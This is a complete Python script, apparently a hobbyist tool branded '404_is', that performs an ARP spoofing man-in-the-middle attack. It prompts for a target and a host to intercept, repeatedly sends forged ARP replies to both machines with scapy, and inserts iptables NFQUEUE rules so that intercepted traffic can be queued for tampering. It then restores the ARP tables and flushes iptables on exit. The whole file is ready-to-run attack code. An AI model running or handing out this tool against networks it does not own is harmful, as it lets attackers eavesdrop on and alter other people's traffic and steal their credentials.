#!/usr/bin/env python

import scapy.all as nitro 
import time
import argparse
import pyfiglet
import sys
import subprocess

result = pyfiglet.figlet_format('404_is', font='slant')
print(result)

print("A ARP spoofer designed by obadare victor")


options = input("do you want to test on your own system:")
if options == "yes":
    subprocess.run(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE"])
elif options == "no":
    subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE"])
    print ("setting iptable rules to rule of other systems")
else:
     input("kindly input yes/no:")


def get_mac(ip):
    _arp_request = nitro.ARP(pdst=ip)
    broadcast = nitro.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/_arp_request
    answered_list = nitro.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    return (answered_list[0][1].hwsrc)
   
def spoof(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    packet = nitro.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip) 
    nitro.send(packet,verbose=False)

def restore (dest_ip, source_ip): 
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = nitro.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    nitro.send(packet, count=4, verbose=False)

target_value = input("404 would need you to enter the target system>>")

host_value = input("404 would need you to enter the host you wish to intercept>>")


target = target_value

host = host_value

try: 
    sent_packets_count = 0
    while True:
        spoof(target, host)
        spoof(host, target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent by 404: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]404 Detected CTRL + c ...Resetting ARP Tables\n")
    restore(target, host)
    restore(host, target)
    subprocess.run(["sudo", "iptables", "--flush"])
except IndexError:
    print("\n[+] 404 Detected an error, try checking if router hasnt blocked 404...Quitting\n")
    subprocess.run(["sudo", "iptables", "--flush"])
except Exception:
    print("\n[+] 404 Detected an error, check the values you inputed..Quitting\n")
    print("flushing iptables")
    subprocess.run(["sudo", "iptables", "--flush"], capture_output=True)